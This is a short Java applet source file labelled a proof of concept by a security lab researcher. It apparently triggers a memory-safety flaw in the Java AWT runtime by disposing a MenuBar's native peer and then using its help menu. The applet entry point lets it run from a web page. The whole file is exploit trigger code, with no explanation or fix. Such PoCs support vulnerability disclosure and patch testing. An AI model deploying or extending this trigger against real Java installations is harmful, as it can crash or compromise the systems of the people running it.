/**
* Author: bo13oy of CloverSec Labs.
**/

import java.applet.*;
import java.awt.Menu;
import java.awt.MenuBar;
import java.awt.peer.MenuComponentPeer;
public class Poc extends Applet {
	
	private static final long serialVersionUID = 1L;
	public static void main(String[] args)
	{
		Poc poc = new Poc();
		poc.run();
	}
	public void init()
	{
		Poc poc = new Poc();
		poc.run();
	}
	public void run()
	{
		
		MenuBar menuBar = new MenuBar();
		Menu menu1 = new java.awt.Menu("A", true);
		menuBar.setHelpMenu(menu1);
		menuBar.addNotify();
		MenuComponentPeer peer = menuBar.getPeer();
		peer.dispose();
		Menu menu2 = menuBar.getHelpMenu();
		menu2.enable();
	}
}